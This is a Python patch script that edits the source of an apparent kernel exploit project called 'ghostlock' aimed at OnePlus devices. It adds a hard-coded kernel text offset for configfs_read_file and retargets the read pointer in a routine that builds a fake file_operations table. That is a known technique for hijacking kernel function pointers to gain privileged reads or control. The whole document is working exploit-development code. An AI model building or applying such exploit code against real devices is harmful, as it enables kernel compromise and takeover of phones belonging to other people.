import re
T="/root/ghostlock/ghostlock-oneplus/src/core/target.h"
U="/root/ghostlock/ghostlock-oneplus/src/core/util.c"
t=open(T).read()
assert "CONFIGFS_READ_FILE_OFF" not in t
anchor="#define CONFIGFS_READ_ITER_OFF      0x002BE7DCULL"
assert t.count(anchor)==1
t=t.replace(anchor, anchor + "\n/* configfs_read_file (non-bin): skips to_frag() when needs_read_fill==0 */\n#define CONFIGFS_READ_FILE_OFF      0x002BE46CULL\n#define CONFIGFS_READ_FILE          (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_OFF)", 1)
open(T,"w").write(t)
print("target.h: CONFIGFS_READ_FILE added")

s=open(U).read()
old="""  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
"""
new="""  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
"""
assert s.count(old)==1, ("put_fake_fops_table", s.count(old))
s=s.replace(old,new,1)
old2="""  put64(p, FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, FOPS_READ_ITER_OFF, 0);
  put64(p, FOPS_WRITE_ITER_OFF, 0);
"""
new2="""  put64(p, FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE));
  put64(p, FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, FOPS_READ_ITER_OFF, 0);
  put64(p, FOPS_WRITE_ITER_OFF, 0);
"""
assert s.count(old2)==1, ("repair", s.count(old2))
s=s.replace(old2,new2,1)
open(U,"w").write(s)
print("util.c: .read = configfs_read_file")
